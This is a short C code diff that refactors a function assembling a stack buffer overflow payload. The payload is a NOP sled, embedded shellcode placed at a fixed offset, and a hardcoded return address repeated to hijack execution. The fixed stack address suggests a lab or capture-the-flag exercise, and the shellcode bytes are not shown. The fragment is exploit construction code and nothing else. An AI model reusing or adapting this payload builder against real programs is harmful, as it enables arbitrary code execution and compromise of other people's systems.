@@ -10,10 +10,12 @@ const int BUF_SIZE = 409, OFFSET = 201;
 const uint32_t RET_ADDR = 0xffffdb5c;
 
 void preparePayload(char *buffer) {
-    memset(buffer, 0x90, BUF_SIZE - 1);
-    memcpy(buffer + OFFSET, shellcode, sizeof(shellcode) - 1);
-    for (int i = OFFSET + sizeof(shellcode) - 1; i < BUF_SIZE - 1; i += 4) {
-        *(uint32_t *)(buffer + i) = RET_ADDR;
+    for (int i = 0; i < BUF_SIZE - 1; ++i) {
+        buffer[i] = (i < OFFSET || i >= OFFSET + sizeof(shellcode) - 1) ? 0x90 : shellcode[i - OFFSET];
+    }
+    uint32_t *ptr = (uint32_t *)(buffer + OFFSET + sizeof(shellcode) - 1);
+    while ((char *)ptr < buffer + BUF_SIZE - 1) {
+        *ptr++ = RET_ADDR;
     }
     buffer[BUF_SIZE - 1] = '\0';
 }
